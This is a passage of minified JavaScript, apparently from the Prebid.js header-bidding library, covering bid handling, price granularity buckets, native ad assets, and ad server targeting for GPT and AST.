          var i = l()(t.bids, function (t) {
            return t.adUnitCode === e.adUnitCode && t.bidId === e.requestId;
          });
          n = function (e, t, n) {
            if (!t) return {};
            var r = {},
              i = M(t.mediaType, e);
            G(r, i, t, n), e && v.a.getOwn(e, A.JSON_MAPPING.ADSERVER_TARGETING) && (G(r, v.a.ownSettingsFor(e), t, n), t.sendStandardTargeting = v.a.get(e, "sendStandardTargeting"));
            t.native && (r = h({}, r, Object(o.e)(t, n)));
            return r;
          }(e.bidderCode, e, i);
        }
        e.adserverTargeting = h(e.adserverTargeting || {}, n);
      }(t, r), E.emit(A.EVENTS.BID_RESPONSE, t), e.addBidReceived(t), R(e, t);
    }
    var k = Object(d.b)("async", function (e, t, n, i) {
      Object(a.b)([t], function (i, o) {
        i ? (Object(r.logWarn)("Failed to save to the video cache: ".concat(i, ". Video bid must be discarded.")), R(e, t)) : "" === o[0].uuid ? (Object(r.logWarn)("Supplied video cache key was already in use by Prebid Cache; caching attempt was rejected. Video bid must be discarded."), R(e, t)) : (t.videoCacheKey = o[0].uuid, t.vastUrl || (t.vastUrl = Object(a.a)(t.videoCacheKey)), D(e, t), n());
      }, i);
    }, "callPrebidCache");
    function N(e, t, n) {
      if (e && n) {
        if (e === y.d) {
          var i = Object(r.deepAccess)(t, "mediaTypes.".concat(y.d, ".context"), "instream");
          if (n["".concat(y.d, "-").concat(i)]) return n["".concat(y.d, "-").concat(i)];
        }
        return n[e];
      }
    }
    var P = function (e, t) {
        var n = N(e, t, u.b.getConfig("mediaTypePriceGranularity"));
        return "string" == typeof e && n ? "string" == typeof n ? n : "custom" : u.b.getConfig("priceGranularity");
      },
      x = function (e) {
        return function (t, n) {
          var r = e || P(t.mediaType, n);
          return r === A.GRANULARITY_OPTIONS.AUTO ? t.pbAg : r === A.GRANULARITY_OPTIONS.DENSE ? t.pbDg : r === A.GRANULARITY_OPTIONS.LOW ? t.pbLg : r === A.GRANULARITY_OPTIONS.MEDIUM ? t.pbMg : r === A.GRANULARITY_OPTIONS.HIGH ? t.pbHg : r === A.GRANULARITY_OPTIONS.CUSTOM ? t.pbCg : void 0;
        };
      };
    function q(e, t) {
      return {
        key: e,
        val: "function" == typeof t ? function (e, n) {
          return t(e, n);
        } : function (e) {
          return Object(r.getValue)(e, t);
        }
      };
    }
    function M(e, t) {
      var n = A.TARGETING_KEYS,
        i = h({}, v.a.settingsFor(null));
      if (i[A.JSON_MAPPING.ADSERVER_TARGETING] || (i[A.JSON_MAPPING.ADSERVER_TARGETING] = function () {
        var e = A.TARGETING_KEYS;
        return [q(e.BIDDER, "bidderCode"), q(e.AD_ID, "adId"), q(e.PRICE_BUCKET, x()), q(e.SIZE, "size"), q(e.DEAL, "dealId"), q(e.SOURCE, "source"), q(e.FORMAT, "mediaType"), q(e.ADOMAIN, function (e) {
          return e.meta && e.meta.advertiserDomains && e.meta.advertiserDomains.length > 0 ? e.meta.advertiserDomains[0] : "";
        })];
      }()), "video" === e) {
        var o = i[A.JSON_MAPPING.ADSERVER_TARGETING].slice();
        if (i[A.JSON_MAPPING.ADSERVER_TARGETING] = o, [n.UUID, n.CACHE_ID].forEach(function (e) {
          void 0 === l()(o, function (t) {
            return t.key === e;
          }) && o.push(q(e, "videoCacheKey"));
        }), u.b.getConfig("cache.url") && (!t || !1 !== v.a.get(t, "sendStandardTargeting"))) {
          var a = Object(r.parseUrl)(u.b.getConfig("cache.url"));
          void 0 === l()(o, function (e) {
            return e.key === n.CACHE_HOST;
          }) && o.push(q(n.CACHE_HOST, function (e) {
            return Object(r.deepAccess)(e, "adserverTargeting.".concat(n.CACHE_HOST)) ? e.adserverTargeting[n.CACHE_HOST] : a.hostname;
          }));
        }
      }
      return i;
    }
    function G(e, t, n, i) {
      var o = t[A.JSON_MAPPING.ADSERVER_TARGETING];
      return n.size = n.getSize(), Object(r._each)(o, function (o) {
        var a = o.key,
          c = o.val;
        if (e[a] && Object(r.logWarn)("The key: " + a + " is being overwritten"), Object(r.isFn)(c)) try {
          c = c(n, i);
        } catch (e) {
          Object(r.logError)("bidmanager", "ERROR", e);
        }
        (void 0 === t.suppressEmptyKeys || !0 !== t.suppressEmptyKeys) && a !== A.TARGETING_KEYS.DEAL || !Object(r.isEmptyStr)(c) && null != c ? e[a] = c : Object(r.logInfo)("suppressing empty key '" + a + "' from adserver targeting");
      }), e;
    }
    function W(e, t) {
      return e[t.adUnitCode] || (e[t.adUnitCode] = {
        bids: []
      }), e[t.adUnitCode].bids.push(t), e;
    }
  },
  2: function (e, t, n) {
    "use strict";

    n.d(t, "c", function () {
      return r;
    }), n.d(t, "d", function () {
      return i;
    }), n.d(t, "b", function () {
      return o;
    }), n.d(t, "a", function () {
      return a;
    });
    var r = "native",
      i = "video",
      o = "banner",
      a = "adpod";
  },
  21: function (e, t, n) {
    "use strict";

    t.a = function (e, t, n) {
      if (!t || !e) return void Object(o.logError)("cannot load external script without url and moduleCode");
      if (!i()(c, t)) return void Object(o.logError)("".concat(t, " not whitelisted for loading external JavaScript"));
      if (a[e]) return n && "function" == typeof n && (a[e].loaded ? n() : a[e].callbacks.push(n)), a[e].tag;
      a[e] = {
        loaded: !1,
        tag: null,
        callbacks: []
      }, n && "function" == typeof n && a[e].callbacks.push(n);
      return Object(o.logWarn)("module ".concat(t, " is loading external JavaScript")), function (t, n) {
        var r = document.createElement("script");
        r.type = "text/javascript", r.async = !0, a[e].tag = r, r.readyState ? r.onreadystatechange = function () {
          "loaded" !== r.readyState && "complete" !== r.readyState || (r.onreadystatechange = null, n());
        } : r.onload = function () {
          n();
        };
        return r.src = t, Object(o.insertElement)(r), r;
      }(e, function () {
        a[e].loaded = !0;
        try {
          for (var t = 0; t < a[e].callbacks.length; t++) a[e].callbacks[t]();
        } catch (e) {
          Object(o.logError)("Error executing callback", "adloader.js:loadExternalScript", e);
        }
      });
    };
    var r = n(12),
      i = n.n(r),
      o = n(0),
      a = {},
      c = ["adloox", "criteo", "outstream", "adagio", "browsi", "brandmetrics"];
  },
  23: function (e, t, n) {
    "use strict";

    n.d(t, "f", function () {
      return f;
    }), n.d(t, "a", function () {
      return l;
    }), t.h = function (e) {
      if (e && e.type && function (e) {
        if (!e || !o()(Object.keys(b), e)) return Object(r.logError)("".concat(e, " nativeParam is not supported")), !1;
        return !0;
      }(e.type)) return b[e.type];
      return e;
    }, t.g = function (e, t) {
      var n = Object(r.getBidRequest)(e.requestId, t);
      if (!n) return !1;
      if (!Object(r.deepAccess)(e, "native.clickUrl")) return !1;
      var i = n.nativeParams;
      if (!i) return !0;
      var a = Object.keys(i).filter(function (e) {
          return i[e].required;
        }),
        c = Object.keys(e.native).filter(function (t) {
          return e.native[t];
        });
      return a.every(function (e) {
        return o()(c, e);
      });
    }, t.b = function (e, t) {
      var n;
      "click" === e.action ? n = t.native && t.native.clickTrackers : (n = t.native && t.native.impressionTrackers, t.native && t.native.javascriptTrackers && Object(r.insertHtmlIntoIframe)(t.native.javascriptTrackers));
      return (n || []).forEach(r.triggerPixel), e.action;
    }, t.e = function (e, t) {
      var n = {};
      Object(r.deepAccess)(t, "nativeParams.rendererUrl") ? e.native.rendererUrl = g(t.nativeParams.rendererUrl) : Object(r.deepAccess)(t, "nativeParams.adTemplate") && (e.native.adTemplate = g(t.nativeParams.adTemplate));
      var i = !1 !== Object(r.deepAccess)(t, "nativeParams.sendTargetingKeys"),
        o = function (e) {
          var t = {};
          Object(r.deepAccess)(e, "nativeParams.ext") && Object.keys(e.nativeParams.ext).forEach(function (e) {
            t[e] = "hb_native_".concat(e);
          });
          return u(u({}, d.NATIVE_KEYS), t);
        }(t),
        a = u(u({}, e.native), e.native.ext);
      return delete a.ext, Object.keys(a).forEach(function (a) {
        var c = o[a],
          u = g(e.native[a]) || g(Object(r.deepAccess)(e, "native.ext.".concat(a)));
        if ("adTemplate" !== a && c && u) {
          var s = Object(r.deepAccess)(t, "nativeParams.".concat(a, ".sendId"));
          if ("boolean" != typeof s && (s = Object(r.deepAccess)(t, "nativeParams.ext.".concat(a, ".sendId"))), s) u = "".concat(c, ":").concat(e.adId);
          var d = Object(r.deepAccess)(t, "nativeParams.".concat(a, ".sendTargetingKeys"));
          "boolean" != typeof d && (d = Object(r.deepAccess)(t, "nativeParams.ext.".concat(a, ".sendTargetingKeys"))), ("boolean" == typeof d ? d : i) && (n[c] = u);
        }
      }), n;
    }, t.d = function (e, t) {
      var n = {
        message: "assetResponse",
        adId: e.adId,
        assets: []
      };
      t.native.hasOwnProperty("adTemplate") && (n.adTemplate = g(t.native.adTemplate));
      t.native.hasOwnProperty("rendererUrl") && (n.rendererUrl = g(t.native.rendererUrl));
      return e.assets.forEach(function (e) {
        var i = Object(r.getKeyByValue)(d.NATIVE_KEYS, e),
          o = g(t.native[i]);
        n.assets.push({
          key: i,
          value: o
        });
      }), n;
    }, t.c = function (e, t) {
      var n = {
        message: "assetResponse",
        adId: e.adId,
        assets: []
      };
      return Object.keys(t.native).forEach(function (e, r) {
        if ("adTemplate" === e && t.native[e]) n.adTemplate = g(t.native[e]);else if ("rendererUrl" === e && t.native[e]) n.rendererUrl = g(t.native[e]);else if ("ext" === e) Object.keys(t.native[e]).forEach(function (r) {
          if (t.native[e][r]) {
            var i = g(t.native[e][r]);
            n.assets.push({
              key: r,
              value: i
            });
          }
        });else if (t.native[e] && d.NATIVE_KEYS.hasOwnProperty(e)) {
          var i = g(t.native[e]);
          n.assets.push({
            key: e,
            value: i
          });
        }
      }), n;
    };
    var r = n(0),
      i = n(12),
      o = n.n(i);
    function a(e) {
      return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function c(e, t) {
      var n = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        t && (r = r.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), n.push.apply(n, r);
      }
      return n;
    }
    function u(e) {
      for (var t = 1; t < arguments.length; t++) {
        var n = null != arguments[t] ? arguments[t] : {};
        t % 2 ? c(Object(n), !0).forEach(function (t) {
          s(e, t, n[t]);
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : c(Object(n)).forEach(function (t) {
          Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
        });
      }
      return e;
    }
    function s(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n, e;
    }
    var d = n(5),
      f = [],
      l = Object.keys(d.NATIVE_KEYS).map(function (e) {
        return d.NATIVE_KEYS[e];
      }),
      b = {
        image: {
          image: {
            required: !0
          },
          title: {
            required: !0
          },
          sponsoredBy: {
            required: !0
          },
          clickUrl: {
            required: !0
          },
          body: {
            required: !1
          },
          icon: {
            required: !1
          }
        }
      };
    function g(e) {
      return "object" === a(e) && e.url ? e.url : e;
    }
  },
  24: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return T;
    }), n.d(t, "b", function () {
      return I;
    }), t.c = C, n.d(t, "d", function () {
      return w;
    });
    var r = n(0),
      i = n(3),
      o = n(23),
      a = n(18),
      c = n(39),
      u = n(2),
      s = n(8),
      d = n(27),
      f = n(12),
      l = n.n(f),
      b = n(11),
      g = n.n(b);
    function p() {
      return (p = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    function y(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n, e;
    }
    function v(e) {
      return function (e) {
        if (Array.isArray(e)) return m(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return m(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return m(e, t);
      }(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function m(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    var h = n(5),
      O = [],
      j = "targetingControls.allowTargetingKeys",
      E = "targetingControls.addTargetingKeys",
      A = 'Only one of "'.concat(j, '" or "').concat(E, '" can be set'),
      S = Object.keys(h.TARGETING_KEYS).map(function (e) {
        return h.TARGETING_KEYS[e];
      }),
      T = {
        isBidNotExpired: function (e) {
          return e.responseTimestamp + 1e3 * e.ttl - 1e3 > Object(r.timestamp)();
        },
        isUnusedBid: function (e) {
          return e && (e.status && !l()([h.BID_STATUS.RENDERED], e.status) || !e.status);
        }
      },
      I = Object(s.b)("sync", function (e, t) {
        var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0,
          o = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
        if (!o) {
          var a = [],
            c = i.b.getConfig("sendBidsControl.dealPrioritization"),
            u = Object(r.groupBy)(e, "adUnitCode");
          return Object.keys(u).forEach(function (e) {
            var i = [],
              o = Object(r.groupBy)(u[e], "bidderCode");
            Object.keys(o).forEach(function (e) {
              return i.push(o[e].reduce(t));
            }), n > 0 ? (i = c ? i.sort(C(!0)) : i.sort(function (e, t) {
              return t.cpm - e.cpm;
            }), a.push.apply(a, v(i.slice(0, n)))) : a.push.apply(a, v(i));
          }), a;
        }
        return e;
      });
    function C() {
      var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
      return function (t, n) {
        return void 0 !== t.adserverTargeting.hb_deal && void 0 === n.adserverTargeting.hb_deal ? -1 : void 0 === t.adserverTargeting.hb_deal && void 0 !== n.adserverTargeting.hb_deal ? 1 : e ? n.cpm - t.cpm : n.adserverTargeting.hb_pb - t.adserverTargeting.hb_pb;
      };
    }
    var w = function (e) {
      var t = {},
        n = {};
      function a(e, t) {
        return e.adserverTargeting && t && (Object(r.isArray)(t) && l()(t, e.adUnitCode) || "string" == typeof t && e.adUnitCode === t);
      }
      function s(e, t) {
        if (!0 === i.b.getConfig("targetingControls.alwaysIncludeDeals")) {
          var n = S.concat(o.a);
          return I(t, r.getHighestCpm).map(function (t) {
            if (t.dealId && a(t, e)) return y({}, t.adUnitCode, x(t, n.filter(function (e) {
              return void 0 !== t.adserverTargeting[e];
            })));
          }).filter(function (e) {
            return e;
          });
        }
        return [];
      }
      function f(e, t) {
        var n = p({}, h.TARGETING_KEYS, h.NATIVE_KEYS),
          i = Object.keys(n),
          o = {};
        Object(r.logInfo)("allowTargetingKeys - allowed keys [ ".concat(t.map(function (e) {
          return n[e];
        }).join(", "), " ]")), e.map(function (e) {
          var r = Object.keys(e)[0],
            a = e[r].filter(function (e) {
              var r = Object.keys(e)[0],
                a = 0 === i.filter(function (e) {
                  return 0 === r.indexOf(n[e]);
                }).length || g()(t, function (e) {
                  var t = n[e];
                  return 0 === r.indexOf(t);
                });
              return o[r] = !a, a;
            });
          e[r] = a;
        });
        var a = Object.keys(o).filter(function (e) {
          return o[e];
        });
        return Object(r.logInfo)("allowTargetingKeys - removed keys [ ".concat(a.join(", "), " ]")), e.filter(function (e) {
          return e[Object.keys(e)[0]].length > 0;
        });
      }
      function b(e, t) {
        var n = Object(r.deepClone)(e);
        return Object.keys(n).map(function (e) {
          return {
            adUnitCode: e,
            adserverTargeting: n[e]
          };
        }).sort(C()).reduce(function (e, i, o, a) {
          var c,
            u = (c = i.adserverTargeting, Object.keys(c).reduce(function (e, t) {
              return e + "".concat(t, "%3d").concat(encodeURIComponent(c[t]), "%26");
            }, ""));
          o + 1 === a.length && (u = u.slice(0, -3));
          var s = i.adUnitCode,
            d = u.length;
          return d <= t ? (t -= d, Object(r.logInfo)("AdUnit '".concat(s, "' auction keys comprised of ").concat(d, " characters.  Deducted from running threshold; new limit is ").concat(t), n[s]), e[s] = n[s]) : Object(r.logWarn)("The following keys for adUnitCode '".concat(s, "' exceeded the current limit of the 'auctionKeyMaxChars' setting.\nThe key-set size was ").concat(d, ", the current allotted amount was ").concat(t, ".\n"), n[s]), o + 1 === a.length && 0 === Object.keys(e).length && Object(r.logError)("No auction targeting keys were permitted due to the setting in setConfig(targetingControls.auctionKeyMaxChars).  Please review setup and consider adjusting."), e;
        }, {});
      }
      function m(e) {
        return e.map(function (e) {
          return y({}, Object.keys(e)[0], e[Object.keys(e)[0]].map(function (e) {
            return y({}, Object.keys(e)[0], e[Object.keys(e)[0]].join(","));
          }).reduce(function (e, t) {
            return p(t, e);
          }, {}));
        }).reduce(function (e, t) {
          var n = Object.keys(t)[0];
          return e[n] = p({}, e[n], t[n]), e;
        }, {});
      }
      function w(t) {
        return "string" == typeof t ? [t] : Object(r.isArray)(t) ? t : e.getAdUnitCodes() || [];
      }
      function B() {
        var t = e.getBidsReceived();
        if (i.b.getConfig("useBidCache")) {
          var o = i.b.getConfig("bidCacheFilterFunction");
          "function" == typeof o && (t = t.filter(function (e) {
            return n[e.adUnitCode] === e.auctionId || !!o(e);
          }));
        } else t = t.filter(function (e) {
          return n[e.adUnitCode] === e.auctionId;
        });
        return t = t.filter(function (e) {
          return Object(r.deepAccess)(e, "video.context") !== u.a;
        }).filter(function (e) {
          return "banner" !== e.mediaType || Object(c.c)([e.width, e.height]);
        }).filter(T.isUnusedBid).filter(T.isBidNotExpired), I(t, r.getOldestHighestCpmBid);
      }
      function _(e, n) {
        var r = t.getWinningBids(e, n),
          i = U();
        return r = r.map(function (e) {
          return y({}, e.adUnitCode, Object.keys(e.adserverTargeting).filter(function (t) {
            return void 0 === e.sendStandardTargeting || e.sendStandardTargeting || -1 === i.indexOf(t);
          }).reduce(function (t, n) {
            var r = [e.adserverTargeting[n]],
              i = y({}, n.substring(0, 20), r);
            if (n === h.TARGETING_KEYS.DEAL) {
              var o = y({}, "".concat(n, "_").concat(e.bidderCode).substring(0, 20), r);
              return [].concat(v(t), [i, o]);
            }
            return [].concat(v(t), [i]);
          }, []));
        });
      }
      function U() {
        return e.getStandardBidderAdServerTargeting().map(function (e) {
          return e.key;
        }).concat(S).filter(r.uniques);
      }
      function R(e, t, n, i) {
        return Object.keys(t.adserverTargeting).filter(D()).forEach(function (n) {
          e.length && e.filter(function (e) {
            return function (n) {
              return n.adUnitCode === t.adUnitCode && n.adserverTargeting[e];
            };
          }(n)).forEach(function (e) {
            return function (n) {
              Object(r.isArray)(n.adserverTargeting[e]) || (n.adserverTargeting[e] = [n.adserverTargeting[e]]), n.adserverTargeting[e] = n.adserverTargeting[e].concat(t.adserverTargeting[e]).filter(r.uniques), delete t.adserverTargeting[e];
            };
          }(n));
        }), e.push(t), e;
      }
      function D() {
        var e = U().concat(o.a);
        return function (t) {
          return -1 === e.indexOf(t);
        };
      }
      function k(e) {
        return y({}, e.adUnitCode, Object.keys(e.adserverTargeting).filter(D()).map(function (t) {
          return y({}, t.substring(0, 20), [e.adserverTargeting[t]]);
        }));
      }
      function N(e, t) {
        return t.filter(function (t) {
          return l()(e, t.adUnitCode);
        }).map(function (e) {
          return p({}, e);
        }).reduce(R, []).map(k).filter(function (e) {
          return e;
        });
      }
      function P(e, t) {
        var n = S.concat(o.a),
          c = i.b.getConfig("sendBidsControl.bidLimit"),
          u = I(t, r.getHighestCpm, c),
          s = i.b.getConfig("targetingControls.allowSendAllBidsTargetingKeys"),
          d = s ? s.map(function (e) {
            return h.TARGETING_KEYS[e];
          }) : n;
        return u.map(function (t) {
          if (a(t, e)) return y({}, t.adUnitCode, x(t, n.filter(function (e) {
            return void 0 !== t.adserverTargeting[e] && -1 !== d.indexOf(e);
          })));
        }).filter(function (e) {
          return e;
        });
      }
      function x(e, t) {
        return t.map(function (t) {
          return y({}, "".concat(t, "_").concat(e.bidderCode).substring(0, 20), [e.adserverTargeting[t]]);
        });
      }
      function q(t) {
        function n(e) {
          return Object(r.deepAccess)(e, h.JSON_MAPPING.ADSERVER_TARGETING);
        }
        return e.getAdUnits().filter(function (e) {
          return l()(t, e.code) && n(e);
        }).map(function (e) {
          return y({}, e.code, function (e) {
            var t = n(e);
            return Object.keys(t).map(function (e) {
              return Object(r.isStr)(t[e]) && (t[e] = t[e].split(",").map(function (e) {
                return e.trim();
              })), Object(r.isArray)(t[e]) || (t[e] = [t[e]]), y({}, e, t[e]);
            });
          }(e));
        });
      }
      return t.setLatestAuctionForAdUnit = function (e, t) {
        n[e] = t;
      }, t.resetPresetTargeting = function (t, n) {
        if (Object(r.isGptPubadsDefined)()) {
          var i = w(t),
            o = e.getAdUnits().filter(function (e) {
              return l()(i, e.code);
            }),
            a = O.reduce(function (e, t) {
              return e[t] = null, e;
            }, {});
          window.googletag.pubads().getSlots().forEach(function (e) {
            var t = Object(r.isFn)(n) && n(e);
            o.forEach(function (n) {
              (n.code === e.getAdUnitPath() || n.code === e.getSlotElementId() || Object(r.isFn)(t) && t(n.code)) && e.updateTargetingFromMap(a);
            });
          });
        }
      }, t.resetPresetTargetingAST = function (e) {
        w(e).forEach(function (e) {
          var t = window.apntag.getTag(e);
          if (t && t.keywords) {
            var n = Object.keys(t.keywords),
              r = {};
            n.forEach(function (e) {
              l()(O, e.toLowerCase()) || (r[e] = t.keywords[e]);
            }), window.apntag.modifyTag(e, {
              keywords: r
            });
          }
        });
      }, t.getAllTargeting = function (e) {
        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : B(),
          n = w(e),
          o = _(n, t).concat(N(n, t)).concat(i.b.getConfig("enableSendAllBids") ? P(n, t) : s(n, t)).concat(q(n));
        o.map(function (e) {
          Object.keys(e).map(function (t) {
            e[t].map(function (e) {
              -1 === O.indexOf(Object.keys(e)[0]) && (O = Object.keys(e).concat(O));
            });
          });
        });
        var a = Object.keys(p({}, h.DEFAULT_TARGETING_KEYS, h.NATIVE_KEYS)),
          c = i.b.getConfig(j),
          u = i.b.getConfig(E);
        if (null != u && null != c) throw new Error(A);
        c = null != u ? a.concat(u) : c || a, Array.isArray(c) && c.length > 0 && (o = f(o, c)), o = m(o);
        var d = i.b.getConfig("targetingControls.auctionKeyMaxChars");
        return d && (Object(r.logInfo)("Detected 'targetingControls.auctionKeyMaxChars' was active for this auction; set with a limit of ".concat(d, " characters.  Running checks on auction keys...")), o = b(o, d)), n.forEach(function (e) {
          o[e] || (o[e] = {});
        }), o;
      }, i.b.getConfig("targetingControls", function (e) {
        null != Object(r.deepAccess)(e, j) && null != Object(r.deepAccess)(e, E) && Object(r.logError)(A);
      }), t.setTargetingForGPT = function (e, t) {
        window.googletag.pubads().getSlots().forEach(function (n) {
          Object.keys(e).filter(t ? t(n) : Object(r.isAdUnitCodeMatchingSlot)(n)).forEach(function (t) {
            Object.keys(e[t]).forEach(function (n) {
              var r = e[t][n];
              "string" == typeof r && -1 !== r.indexOf(",") && (r = r.split(",")), e[t][n] = r;
            }), Object(r.logMessage)("Attempting to set targeting-map for slot: ".concat(n.getSlotElementId(), " with targeting-map:"), e[t]), n.updateTargetingFromMap(e[t]);
          });
        });
      }, t.getWinningBids = function (e) {
        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : B(),
          n = w(e);
        return t.filter(function (e) {
          return l()(n, e.adUnitCode);
        }).filter(function (e) {
          return !0 === d.a.get(e.bidderCode, "allowZeroCpmBids") ? e.cpm >= 0 : e.cpm > 0;
        }).map(function (e) {
          return e.adUnitCode;
        }).filter(r.uniques).map(function (e) {
          return t.filter(function (t) {
            return t.adUnitCode === e ? t : null;
          }).reduce(r.getHighestCpm);
        });
      }, t.setTargetingForAst = function (e) {
        var n = t.getAllTargeting(e);
        try {
          t.resetPresetTargetingAST(e);
        } catch (e) {
          Object(r.logError)("unable to reset targeting for AST" + e);
        }
        Object.keys(n).forEach(function (e) {
          return Object.keys(n[e]).forEach(function (t) {
            if (Object(r.logMessage)("Attempting to set targeting for targetId: ".concat(e, " key: ").concat(t, " value: ").concat(n[e][t])), Object(r.isStr)(n[e][t]) || Object(r.isArray)(n[e][t])) {
              var i = {};
              t.search(/pt[0-9]/) < 0 ? i[t.toUpperCase()] = n[e][t] : i[t] = n[e][t], window.apntag.setKeywords(e, i, {
                overrideKeyValue: !0
              });
            }
          });
        });
      }, t.isApntagDefined = function () {
        if (window.apntag && Object(r.isFn)(window.apntag.setKeywords)) return !0;
      }, t;
    }(a.a);
  },
  25: function (e, t, n) {
    "use strict";

    t.a = function (e, t) {
      return new i(e, t);
    };
    var r = n(0);
    function i(e, t) {
      var n = t && t.src || "client",
        i = e || 0;
      this.bidderCode = t && t.bidder || "", this.width = 0, this.height = 0, this.statusMessage = function () {
        switch (i) {
          case 0:
            return "Pending";
          case 1:
            return "Bid available";
          case 2:
            return "Bid returned empty or error response";
          case 3:
            return "Bid timed out";
        }
      }(), this.adId = Object(r.getUniqueIdentifierStr)(), this.requestId = t && t.bidId, this.mediaType = "banner", this.source = n, this.getStatusCode = function () {
        return i;
      }, this.getSize = function () {
        return this.width + "x" + this.height;
      };
    }
  },
  27: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return d;
    });
    var r = n(0),
      i = n(14);
    function o(e, t) {
      for (var n = 0; n < t.length; n++) {
        var r = t[n];
        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r);
      }
    }
    function a(e, t, n) {
      if (!t.has(e)) throw new TypeError("attempted to get private field on non-instance");
      return n;
    }
    var c = n(5),
      u = new WeakSet();
    function s(e) {
      return null == e ? this.defaultScope : e;
    }
    var d = new (function () {
      function e(t, n) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), u.add(this), this.getSettings = t, this.defaultScope = n;
      }
      var t, n, i;
      return t = e, (n = [{
        key: "get",
        value: function (e, t) {
          var n = this.getOwn(e, t);
          return void 0 === n && (n = this.getOwn(null, t)), n;
        }
      }, {
        key: "getOwn",
        value: function (e, t) {
          return e = a(this, u, s).call(this, e), Object(r.deepAccess)(this.getSettings(), "".concat(e, ".").concat(t));
        }
      }, {
        key: "getScopes",
        value: function () {
          var e = this;
          return Object.keys(this.getSettings()).filter(function (t) {
            return t !== e.defaultScope;
          });
        }
      }, {
        key: "settingsFor",
        value: function (e) {
          return Object(r.mergeDeep)({}, this.ownSettingsFor(null), this.ownSettingsFor(e));
        }
      }, {
        key: "ownSettingsFor",
        value: function (e) {
          return e = a(this, u, s).call(this, e), this.getSettings()[e] || {};
        }
      }]) && o(t.prototype, n), i && o(t, i), e;
    }())(function () {
      return Object(i.a)().bidderSettings || {};
    }, c.JSON_MAPPING.BD_SETTING_STANDARD);
  },
  29: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return f;
    }), n.d(t, "b", function () {
      return b;
    });
    var r = n(11),
      i = n.n(r),
      o = n(0),
      a = {
        buckets: [{
          max: 5,
          increment: .5
        }]
      },
      c = {
        buckets: [{
          max: 20,
          increment: .1
        }]
      },
      u = {
        buckets: [{
          max: 20,
          increment: .01
        }]
      },
      s = {
        buckets: [{
          max: 3,
          increment: .01
        }, {
          max: 8,
          increment: .05
        }, {
          max: 20,
          increment: .5
        }]
      },
      d = {
        buckets: [{
          max: 5,
          increment: .05
        }, {
          max: 10,
          increment: .1
        }, {
          max: 20,
          increment: .5
        }]
      };
    function f(e, t) {
      var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 1,
        r = parseFloat(e);
      return isNaN(r) && (r = ""), {
        low: "" === r ? "" : l(e, a, n),
        med: "" === r ? "" : l(e, c, n),
        high: "" === r ? "" : l(e, u, n),
        auto: "" === r ? "" : l(e, d, n),
        dense: "" === r ? "" : l(e, s, n),
        custom: "" === r ? "" : l(e, t, n)
      };
    }
    function l(e, t, n) {
      var r = "";
      if (!b(t)) return r;
      var o = t.buckets.reduce(function (e, t) {
          return e.max > t.max ? e : t;
        }, {
          max: 0
        }),
        a = 0,
        c = i()(t.buckets, function (t) {
          if (e > o.max * n) {
            var i = t.precision;
            void 0 === i && (i = 2), r = (t.max * n).toFixed(i);
          } else {
            if (e <= t.max * n && e >= a * n) return t.min = a, t;
            a = t.max;
          }
        });
      return c && (r = function (e, t, n) {
        var r = void 0 !== t.precision ? t.precision : 2,
          i = t.increment * n,
          o = t.min * n,
          a = Math.pow(10, r + 2),
          c = (e * a - o * a) / (i * a),
          u = Math.floor(c) * i + o;
        return (u = Number(u.toFixed(10))).toFixed(r);
      }(e, c, n)), r;
    }
    function b(e) {
      if (Object(o.isEmpty)(e) || !e.buckets || !Array.isArray(e.buckets)) return !1;
      var t = !0;
      return e.buckets.forEach(function (e) {
        e.max && e.increment || (t = !1);
      }), t;
    }
  },
  3: function (e, t, n) {
    "use strict";

    n.d(t, "a", function () {
      return h;
    }), n.d(t, "b", function () {
      return A;
    });
    var r = n(29),
      i = n(11),
      o = n.n(i),
      a = n(12),
      c = n.n(a),
      u = n(0),
      s = ["fpd"];
    function d(e, t) {
      var n = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        t && (r = r.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), n.push.apply(n, r);
      }
      return n;
    }
    function f(e, t) {
      if (null == e) return {};
